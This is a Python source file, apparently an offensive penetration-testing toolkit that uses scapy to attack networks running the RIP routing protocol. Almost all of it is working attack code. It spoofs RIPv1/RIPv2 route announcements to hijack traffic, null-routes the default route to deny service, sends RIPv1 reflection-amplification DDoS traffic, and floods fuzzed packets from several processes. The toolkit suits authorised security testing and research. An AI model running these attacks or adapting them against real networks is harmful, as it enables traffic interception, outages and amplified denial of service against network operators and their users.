#!/usr/bin/python

#
# Currently implemented attacks:
#   - sniffer     - (NOT YET IMPLEMENTED) Sniffer hunting for authentication strings
#   - ripv1-route - Spoofed RIPv1 Route Announcements
#   - ripv1-dos   - RIPv1 Denial of Service via Null-Routing
#   - ripv1-ampl  - RIPv1 Reflection Amplification DDoS
#   - ripv2-route - Spoofed RIPv2 Route Announcements
#   - ripv2-dos   - RIPv2 Denial of Service via Null-Routing
#   - rip-fuzzer  - RIPv1/RIPv2 protocol fuzzer, covering RIPAuth and RIPEntry structures fuzzing
#
# Python requirements:
#   - scapy
#
# Mariusz Banach / mgeeky, '19, <mb@binary-offensive.com>
#

import sys
import socket
import fcntl
import struct
import string
import random
import commands
import argparse
import multiprocessing

try:
    from scapy.all import *
except ImportError:
    print('[!] Scapy required: pip install scapy')
    sys.exit(1)
 
VERSION = '0.1'

config = {
    'verbose' : False,
    'debug' : False,
    'delay' : 1.0,
    'interface': None,
    'processors' : 8,

    'network': '',
    'spoof': '',
    'nexthop': '',
    'netmask': '',
    'metric': 0,

    'auth-type': '',
    'auth-data': '',
}

attacks = {}
stopThreads = False


#
# ===============================================
#

def flooder(num, packets):
    Logger.dbg('Starting task: {}, packets num: {}'.format(num, len(packets)))

    for p in packets:
        if stopThreads: break
        try:
            if stopThreads: 
                raise KeyboardInterrupt

            sendp(p, verbose = False)

            if len(p) < 1500:
                Logger.dbg("Sent: \n" + str(p))

        except KeyboardInterrupt:
            break
        except Exception as e:
            pass

    Logger.dbg('Stopping task: {}'.format(num))

class Logger:
    @staticmethod
    def _out(x): 
        if config['verbose'] or config['debug']: 
            sys.stdout.write(x + '\n')

    @staticmethod
    def out(x): 
        Logger._out('[.] ' + x)
    
    @staticmethod
    def info(x):
        Logger._out('[.] ' + x)

    @staticmethod
    def dbg(x):
        if config['debug']:
            Logger._out('[dbg] ' + x)
    
    @staticmethod
    def err(x): 
        sys.stdout.write('[!] ' + x + '\n')
    
    @staticmethod
    def fail(x):
        Logger._out('[-] ' + x)
    
    @staticmethod
    def ok(x):  
        Logger._out('[+] ' + x)

# Well, not very fuzzy that fuzzer I know. 
class Fuzzer:
    @staticmethod
    def get8bitFuzzes():
        out = set()
        for i in range(9):
            out.add(2 ** i - 1)
            out.add(2 ** i - 2)
            out.add(2 ** i)
            out.add(2 ** i + 1)
            #out.add(2 ** i + 2)
        return [k for k in out if abs(k) < 2**8]

    @staticmethod
    def get16bitFuzzes():
        out = set()
        for i in range(17):
            out.add(2 ** i - 1)
            out.add(2 ** i - 2)
            out.add(2 ** i)
            out.add(2 ** i + 1)
            #out.add(2 ** i + 2)
        return [k for k in out if abs(k) < 2**16]

    @staticmethod
    def get32bitFuzzes():
        out = set()
        for i in range(33):
            out.add(2 ** i - 1)
            out.add(2 ** i - 2)
            out.add(2 ** i)
            out.add(2 ** i + 1)
            #out.add(2 ** i + 2)
        return [k for k in out if abs(k) < 2**32]

    @staticmethod
    def deBrujinPattern(length):
        if length == 0: return ''

        if length >= 20280:
            out = ''
            out += Fuzzer.deBrujinPattern(20280 - 1)
            out += "A" * (length - 20280 - 1)
            return out

        pattern = ''
        for upper in string.ascii_uppercase:
            for lower in string.ascii_lowercase:
                for digit in string.digits:
                    if len(pattern) < length:
                        pattern += upper + lower + digit
                    else:
                        out = pattern[:length]
                        return out
        return pattern

    @staticmethod
    def getFuzzyStrings(maxLen = -1, allOfThem = True):
        out = set()
        for b in Fuzzer.get16bitFuzzes():
            out.add(Fuzzer.deBrujinPattern(b))

        if allOfThem:
            for b in range(0, 65400, 256): 
                if maxLen != -1 and b > maxLen: break
                out.add(Fuzzer.deBrujinPattern(b))

        if maxLen != -1:
            return set([x for x in out if len(x) <= maxLen])

        return out

    @staticmethod
    def get32bitProblematicPowersOf2():
        return Fuzzer.get32bitFuzzes()

class RoutingAttack:
    def __init__(self):
        pass

    def injectOptions(self, params, config):
        pass

    def launch(self):
        pass

class Sniffer(RoutingAttack):
    def __init__(self):
        pass

    def injectOptions(self, params, config):
        self.config = config
        self.config.update(params)

    def processPacket(pkt):
        # TODO
        raise Exception('Not yet implemented.')

    def launch(self):
        # TODO
        raise Exception('Not yet implemented.')

        def packetCallback(d):
            self.processPacket(d)

        try:
            pkts = sniff(
                count = 1000,
                filter = 'udp port 520',
                timeout = 10.0,
                prn = packetCallback,
                iface = self.config['interface']
            )
        except Exception as e:
            if 'Network is down' in str(e):
                pass
            else: 
                Logger.err('Exception occured during sniffing: {}'.format(str(e)))
        except KeyboardInterrupt:
            pass


class RIPv1v2Attacks(RoutingAttack):
    ripAuthTypes = {
        'simple' : 2, 'md5' : 3, 'md5authdata': 1
    }

    def __init__(self):
        self.config = {
            'interface' : '',
            'delay': 1,
            'network' : '',
            'metric' : 10,
            'netmask' : '255.255.255.0',
            'nexthop' : '0.0.0.0',
            'spoof' : '',
            'version' : 0,
        }

    @staticmethod
    def getRipAuth(config):
        ripauth = RIPAuth() 

        ripauth.authtype = RIPv1v2Attacks.ripAuthTypes[config['auth-type']]
        if ripauth.authtype == 2:
            ripauth.password = config['auth-data']
        elif ripauth.authtype == 1:
            ripauth.authdata = config['auth-data']
        elif ripauth.authtype == 3:
            ripauth.digestoffset = 0
            ripauth.keyid = 0
            ripauth.authdatalen = len(config['auth-data'])
            ripauth.seqnum = 0

        return ripauth

    def injectOptions(self, params, config):
        self.config = config
        self.config.update(params)

        Logger.info("Fake Route Announcement to be injected:")
        Logger.info("\tNetwork: {}".format(config['network']))
        Logger.info("\tNetmask: {}".format(config['netmask']))
        Logger.info("\tNexthop: {}".format(config['nexthop']))
        Logger.info("\tMetric: {}".format(config['metric']))

        if not config['network'] or not config['netmask'] \
            or not config['nexthop'] or not config['metric']:
            Logger.err("Module needs following options to operate: network, netmask, nexthop, metric")
            return False

        if params['version'] != 1 and params['version'] != 2:
            Logger.err("RIP protocol version must be either 1 or 2 as passed in attacks params!")
            return False

        return True

    def launch(self):
        packet = self.getPacket()
        Logger.info("Sending RIPv{} Spoofed Route Announcements...".format(self.config['version']))
        sendp(packet, loop = 1, inter = self.config['delay'], iface = config['interface'])

    def getPacket(self):
        networkToAnnounce = self.config['network']
        metricToAnnounce = self.config['metric']
        netmaskToAnnounce = self.config['netmask']
        nexthopToAnnounce = self.config['nexthop']
        spoofedIp = self.config['spoof']

        etherframe      = Ether()                       # Start definition of Ethernet Frame

        ip              = IP()                          # IPv4 packet

        udp             = UDP()
        udp.sport       = 520                           # According to RFC1058, 520/UDP port must be used for solicited communication
        udp.dport       = 520

        rip             = RIP()

        ripentry        = RIPEntry()                    # Announced route
        ripentry.AF     = "IP"                          # Address Family: IP

        if 'AF' in self.config.keys():
            ripentry.AF = self.config['AF']

        ripentry.addr   = networkToAnnounce             # Spoof route for this network...
        ripentry.metric = metricToAnnounce

        if self.config['version'] == 1:
            ip.dst          = '255.255.255.255'             # RIPv1 broadcast destination
            etherframe.dst  = 'ff:ff:ff:ff:ff:ff'

            rip.version     = 1                             # RIPv1
            rip.cmd         = 2                             # Command: Response

        elif self.config['version'] == 2:
            ip.dst          = '224.0.0.9'                   # RIPv2 multicast destination

            rip.version     = 2                             # RIPv2
            rip.cmd         = 2                             # Command: Response
            ripentry.RouteTag = 0
            ripentry.mask   = netmaskToAnnounce 
            ripentry.nextHop = nexthopToAnnounce            # ... to be going through this next hop device.

        if 'rip_cmd' in self.config.keys():
            rip.cmd = self.config['rip_cmd']
       
        if not self.config['auth-type']:
            rip_packet = etherframe / ip / udp / rip / ripentry
        else:
            ripauth = RIPv1v2Attacks.getRipAuth(self.config)
            Logger.info('Using RIPv2 authentication: type={}, pass="{}"'.format(
                self.config['auth-type'], self.config['auth-data']
            ))
            rip_packet = etherframe / ip / udp / rip / ripauth / ripentry

        rip_packet[IP].src = spoofedIp
        return rip_packet

class RIPFuzzer(RoutingAttack):
    ripCommands = (
        1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11
    )

    def __init__(self):
        self.config = {
            'interface' : '',
            'network' : '192.168.1.0',
            'metric' : 10,
            'netmask' : '255.255.255.0',
            'nexthop' : '0.0.0.0',
            'spoof' : '',
        }

    def injectOptions(self, params, config):
        self.config = config
        self.params = params

        return True

    def launch(self):
        packets = set()
        Logger.info("Generating fuzzed packets for RIPv1...")
        packets.update(self.generateRipv1Packets())

        Logger.info("Generating fuzzed packets for RIPv2...")
        packets.update(self.generateRipv2Packets())

        Logger.info("Collected in total {} packets to send. Sending them out...".format(len(packets)))

        packetsLists = [[] for x in range(self.config['processors'])]
        packetsList = list(packets)
        for i in range(len(packetsList)):
            packetsLists[i % config['processors']].append(packetsList[i])

        jobs = []

        for i in range(config['processors']):
            task = multiprocessing.Process(target = flooder, args = (i, packetsLists[i]))
            jobs.append(task)
            task.daemon = True
            task.start()

        print('[+] Started flooding. Press CTRL-C to stop that.')
        try:
            while jobs:
                jobs = [job for job in jobs if job.is_alive()]
        except KeyboardInterrupt:
            stopThreads = True
            print('\n[>] Stopping...')

        stopThreads = True
        time.sleep(3)

        Logger.ok("Fuzzing finished. Sent around {} packets.".format(len(packets)))


    def generateRipv1Packets(self):
        packets = set()
        base = Ether(dst = 'ff:ff:ff:ff:ff:ff') / IP(dst = '255.255.255.255') / UDP(sport = 520, dport = 520)

        # Step 1: Fuzz on Command values.
        for val in set(RIPFuzzer.ripCommands + tuple(Fuzzer.get8bitFuzzes())):
            rip = RIP(version = 1, cmd = val)
            packets.add(base / rip)
            packets.add(base / rip / RIPEntry() )

        # Step 1b: Fuzz on Command values with packet filled up with data
        for val in set(RIPFuzzer.ripCommands + tuple(Fuzzer.get8bitFuzzes())):
            rip = RIP(version = 1, cmd = val)

            for data in Fuzzer.getFuzzyStrings():
                if not data: data = ''
                packets.add(base / rip / data)
                packets.add(base / rip / RIPEntry() / data)

        # Step 2: Fuzz on Response RIPEntry AF values.
        for val in set(Fuzzer.get8bitFuzzes()):
            rip = RIP(version = 1, cmd = 2)
            packets.add(base / rip / RIPEntry(AF = val) )

        # Step 3: Fuzz on Response RIPEntry RouteTag values.
        for val in set(Fuzzer.get8bitFuzzes()):
            rip = RIP(version = 1, cmd = 2)
            packets.add(base / rip / RIPEntry(RouteTag = val) )

        # Step 4: Fuzz on Response RIPEntry metric values.
        for val in set(Fuzzer.get8bitFuzzes()):
            rip = RIP(version = 1, cmd = 2)
            packets.add(base / rip / RIPEntry(metric = val) )

        # Step 5: Add multiple RIPEntry structures
        for num in Fuzzer.get32bitProblematicPowersOf2():
            rip = RIP(version = 1, cmd = 2)
            entries = []
            try:
                ipv4 = socket.inet_ntoa(struct.pack('!L', num))
            except:
                ipv4 = '127.0.0.2'

            if (num * 20) > 2 ** 16: 
                break

            for i in range(num):
                entries.append(RIPEntry(addr = ipv4))

            packets.add(base / rip / ''.join([str(x) for x in entries]))

        return packets

    def generateRipv2Packets(self):
        packets = set()
        base = Ether() / IP(src = self.config['spoof'], dst = '224.0.0.9') / UDP(sport = 520, dport = 520)

        # Step 1: Fuzz on Command values.
        for val in set(RIPFuzzer.ripCommands + tuple(Fuzzer.get8bitFuzzes())):
            rip = RIP(version = 2, cmd = val)
            packets.add(base / rip)
            packets.add(base / rip / RIPEntry() )

        # Step 1b: Fuzz on Command values with packet filled up with data
        for val in set(RIPFuzzer.ripCommands + tuple(Fuzzer.get8bitFuzzes())):
            rip = RIP(version = 2, cmd = val)

            for data in Fuzzer.getFuzzyStrings():
                if not data: data = ''
                packets.add(base / rip / data)
                packets.add(base / rip / RIPEntry() / data)

        # Step 2: Fuzz on Version values.
        for val in set(Fuzzer.get8bitFuzzes()):
            rip = RIP(version = val, cmd = 1)
            packets.add(base / rip)
            packets.add(base / rip / RIPEntry() )

        # Step 3: Fuzz on Authentication data values.
        for val in set(Fuzzer.get8bitFuzzes()):
            rip = RIP(version = val, cmd = 1)
            for auth in RIPFuzzer.fuzzRipv2Auth():
                packets.add(base / rip / auth )
                packets.add(base / rip / auth / RIPEntry() )

        # Step 4: Fuzz on Response RIPEntry AF values.
        for val in set(Fuzzer.get8bitFuzzes()):
            rip = RIP(version = 2, cmd = 2)
            packets.add(base / rip / RIPEntry(AF = val) )

        # Step 5: Fuzz on Response RIPEntry RouteTag values.
        for val in set(Fuzzer.get8bitFuzzes()):
            rip = RIP(version = 2, cmd = 2)
            packets.add(base / rip / RIPEntry(RouteTag = val) )

        # Step 6: Fuzz on Response RIPEntry metric values.
        for val in set(Fuzzer.get8bitFuzzes()):
            rip = RIP(version = 2, cmd = 2)
            packets.add(base / rip / RIPEntry(metric = val) )

        # Step 7: Add multiple RIPEntry structures
        for num in Fuzzer.get32bitProblematicPowersOf2():
            rip = RIP(version = 2, cmd = 2)
            entries = []
            try:
                ipv4 = socket.inet_ntoa(struct.pack('!L', num))
            except:
                ipv4 = '127.0.0.2'

            if (num * 20) > 2 ** 16: 
                break

            for i in range(num):
                entries.append(RIPEntry(addr = ipv4))

            packets.add(base / rip / ''.join([str(x) for x in entries]))

        return packets

    @staticmethod
    def fuzzRipv2Auth():
        auths = set()
        
        # Step 1: Fuzz on RIPAuth authtype.
        for val in set(Fuzzer.get8bitFuzzes()):
            ripauth = RIPAuth()
            ripauth.authtype = val
            ripauth.password = '0123456789abcdef'
            auths.add(ripauth)
        
        # Step 2: Fuzz on RIPAuth md5authdata structure's digestoffset.
        for val in set(Fuzzer.get16bitFuzzes()):
            ripauth = RIPAuth()
            ripauth.authtype = 1
            ripauth.digestoffset = val
            ripauth.keyid = 0
            ripauth.authdatalen = '\x01\x02\x03\x04\x05\x06\x07\x08'
            ripauth.seqnum = 0
            auths.add(ripauth)
        
        # Step 3: Fuzz on RIPAuth md5authdata structure's keyid.
        for val in set(Fuzzer.get8bitFuzzes()):
            ripauth = RIPAuth()
            ripauth.authtype = 1
            ripauth.digestoffset = 0
            ripauth.keyid = val
            ripauth.authdatalen = '\x01\x02\x03\x04\x05\x06\x07\x08'
            ripauth.seqnum = 0
            auths.add(ripauth)
        
        # Step 4: Fuzz on RIPAuth md5authdata structure's seqnum.
        for val in set(Fuzzer.get8bitFuzzes()):
            ripauth = RIPAuth()
            ripauth.authtype = 1
            ripauth.digestoffset = 0
            ripauth.keyid = 0
            ripauth.authdatalen = '\x01\x02\x03\x04\x05\x06\x07\x08'
            ripauth.seqnum = val
            auths.add(ripauth)
        
        # Step 5: Fuzz on RIPAuth md5authdata structure's authdatalen.
        for val in set(Fuzzer.getFuzzyStrings(maxLen = 16, allOfThem = False)):
            ripauth = RIPAuth()
            ripauth.authtype = 1
            ripauth.digestoffset = 0
            ripauth.keyid = 0
            ripauth.authdatalen = val
            ripauth.seqnum = 0
            auths.add(ripauth)

        return auths


def getHwAddr(ifname):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    info = fcntl.ioctl(s.fileno(), 0x8927,  struct.pack('256s', ifname[:15]))
    return ':'.join(['%02x' % ord(char) for char in info[18:24]])

def getIfaceIP(iface):
    out = shell("ip addr show " + iface + " | grep 'inet ' | awk '{print $2}' | head -1 | cut -d/ -f1")
    Logger.dbg('Interface: {} has IP: {}'.format(iface, out))
    return out

def shell(cmd):
    out = commands.getstatusoutput(cmd)[1]
    Logger.dbg('shell("{}") returned:\n"{}"'.format(cmd, out))
    return out

def selectDefaultInterface():
    global config
    commands = {
        'ip' :      "ip route show | grep default | awk '{print $5}' | head -1",
        'ifconfig': "route -n | grep 0.0.0.0 | grep 'UG' | awk '{print $8}' | head -1",
    }

    for k, v in commands.items():
        out = shell(v)
        if len(out) > 0:
            Logger.dbg('Default interface lookup command returned:\n{}'.format(out))
            config['interface'] = out
            return out

    return ''
 
def parseOptions(argv):
    global config

    print('''
        :: Routing Protocols Exploitation toolkit
        Sends out various routing protocols management frames 
        Mariusz Banach / mgeeky '19, <mb@binary-offensive.com>
        v{}
'''.format(VERSION))

    parser = argparse.ArgumentParser(prog = argv[0], usage='%(prog)s [options]')
    parser.add_argument('-v', '--verbose', action='store_true', help='Display verbose output.')
    parser.add_argument('-D', '--debug', action='store_true', help='Display debug output.')
    parser.add_argument('-d', '--delay', type=float, default=1.0, help='Delay in seconds (float) between sending consecutive packets. Default: 1 second. Not applies to fuzzers.')
    parser.add_argument('-t', '--attack', metavar='ATTACK', default='', help='Select attack to launch. One can use: "-t list" to list available attacks.')
    parser.add_argument('-i', '--interface', metavar='DEV', default='', help='Select interface on which to operate.')
    parser.add_argument('-s', '--spoof', help = 'IP address to be used as a spoofed/fake gateway, e.g. Attacker machine address. By default will try to figure out that address automatically.', default='')

    auth = parser.add_argument_group('Routing Protocol Authentication', 'Specifies authentication data for Routing protocol to use')
    auth.add_argument('--auth-type', help = 'Authentication type. Can be one of following: "simple", "md5authdata", "md5". Applies only to authentication-capable protocols, like RIPv2', default='')
    auth.add_argument('--auth-data', help = 'Password / authentication data to pass in every packet. This field depends on the "--auth-type" used.', default='')

    route = parser.add_argument_group('Spoofed Route injection', 'Specifies fake route details to inject')
    route.add_argument('-a', '--network', help = 'IP address of network to announce, can be paired with netmask in CIDR notation. One can use "default" for 0.0.0.0')
    route.add_argument('-b', '--netmask', help = 'Netmask to use (can be inferred from "--network". Default: /24', default='255.255.255.0')
    route.add_argument('-c', '--nexthop', help = 'Spoofed next hop address. Default: 0.0.0.0.', default = '0.0.0.0')
    route.add_argument('-m', '--metric', help = 'Metric to be used. The lower the greater priority it gets. Default: 10', type=int, default='10')

    args = parser.parse_args()

    if not 'attack' in args:
        Logger.err('You must specify an attack to launch!')
        return False

    if args.attack == 'list':
        print("Available attacks:")
        for a in attacks:
            print("\t{}. '{}' - {}".format(a['num'], a['name'], a['desc']))
        sys.exit(0)

    else:
        att = args.attack
        try:
            att = int(att)
        except: pass
        
        for a in attacks:
            if att == a['num'] or att == a['name']:
                config['attack'] = a
                break
           
    if 'attack' not in config or not config['attack']:
        Logger.err("Selected attack is not implemented or wrongly stated.")
        parser.print_help()
        return False

    config['verbose'] = args.verbose
    config['debug'] = args.debug
    config['delay'] = args.delay

    if args.interface != '': config['interface'] = args.interface
    else: config['interface'] = selectDefaultInterface()

    if args.network != '': config['network'] = args.network

    if args.spoof != '': config['spoof'] = args.spoof
    else: config['spoof'] = getIfaceIP(config['interface'])

    Logger.info("Using {} as local/spoof IP address".format(config['spoof']))

    if args.netmask != '': config['netmask'] = args.netmask
    if args.nexthop != '': config['nexthop'] = args.nexthop
    if args.metric != '': config['metric'] = args.metric

    if args.auth_type != '': config['auth-type'] = args.auth_type
    if args.auth_data != '': config['auth-data'] = args.auth_data

    if config['auth-type'] != '':
        if config['auth-data'] == '':
            Logger.err("You must specify authentication data along with the --auth-type.")
            return False

        config['auth-type'] = args.auth_type
        config['auth-data'] = args.auth_data

    return args

def main(argv):
    global attacks
    attacks = (
        {
            'num': 0, 
            'name': 'sniffer', 
            'desc': '(NOT YET IMPLEMENTED) Sniffer hunting for authentication strings.', 
            'object': Sniffer,
            'params': {
            }
        },
        {
            'num': 1, 
            'name': 'ripv1-route', 
            'desc': 'RIP Spoofed Route announcement', 
            'object': RIPv1v2Attacks,
            'params': {
                'version' : 1,
            }
        },
        {
            'num': 2, 
            'name': 'ripv1-dos', 
            'desc': 'RIPv1 Denial of Service by Null-routing', 
            'object': RIPv1v2Attacks,
            'params': {
                'version' : 1,
                'delay' : 1,
                'network': '0.0.0.0',
                'metric': 1
            }
        },
        {
            'num': 3, 
            'name': 'ripv1-ampl', 
            'desc': 'RIPv1 Reflection Amplification DDoS',
            'object': RIPv1v2Attacks,
            'params': {
                'version' : 1,
                'delay' : 0.5,
                'network': '0.0.0.0',
                'netmask': '0.0.0.0',
                'nexthop': '0.0.0.1',
                'metric': 1,
                'AF': 0, # Unspecified
                'rip_cmd': 1, # Request
            }
        },
        {
            'num': 4, 
            'name': 'ripv2-route', 
            'desc': 'RIPv2 Spoofed Route announcement', 
            'object': RIPv1v2Attacks,
            'params': {
                'version' : 2,
            }
        },
        {
            'num': 5, 
            'name': 'ripv2-dos', 
            'desc': 'RIPv2 Denial of Service by Null-routing', 
            'object': RIPv1v2Attacks,
            'params': {
                'version' : 2,
                'delay' : 1,
                'network': '0.0.0.0',
                'netmask': '0.0.0.0',
                'nexthop': '0.0.0.1',
                'metric': 1
            }
        },
        {
            'num': 6, 
            'name': 'rip-fuzzer', 
            'desc': 'RIP/RIPv2 packets fuzzer', 
            'object': RIPFuzzer,
            'params': {
            }
        },
    )

    opts = parseOptions(argv)
    if not opts:
        Logger.err('Options parsing failed.')
        return False

    if os.getuid() != 0:
        Logger.err('This program must be run as root.')
        return False

    load_contrib('ospf')
    load_contrib('eigrp')
    load_contrib('bgp')

    attack = config['attack']['object']()
    print("[+] Launching attack: {}".format(config['attack']['desc']))
    if attack.injectOptions(config['attack']['params'], config):
        attack.launch()

    else:
        Logger.err("Module prerequisite options were not passed correctly.")

if __name__ == '__main__':
    main(sys.argv) 
